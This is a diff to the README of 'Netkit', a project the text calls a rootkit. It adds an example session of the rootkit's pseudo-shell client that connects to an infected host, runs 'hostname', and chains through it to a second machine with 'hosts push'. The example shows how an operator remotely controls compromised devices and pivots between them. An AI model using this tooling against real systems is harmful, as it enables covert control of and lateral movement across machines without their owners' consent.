@@ -15,7 +15,20 @@ Netkit has several features:
 Once the rootkit is loaded into the system, a user may want to interact with it using the provided psuedo-shell:
 ```bash
 cd netkit
-python3 client/shell.py
+$ python3 client/shell.py 10.10.10.1:8008
+10.10.10.1:8008/ $ hosts     
+usage:
+- hosts push <ip>:<port>
+- hosts pop
+
+10.10.10.1:8008/ $ hostname
+gateway-1a723f
+
+10.10.10.1:8008/ $ hosts push 10.10.10.2:8008
+[+] successfully added device 10.10.10.2:8008 to hosts list
+10.10.10.1:8008->10.10.10.2:8008/ $ hostname
+mail-server
+
 ```
 
 ### Compilation
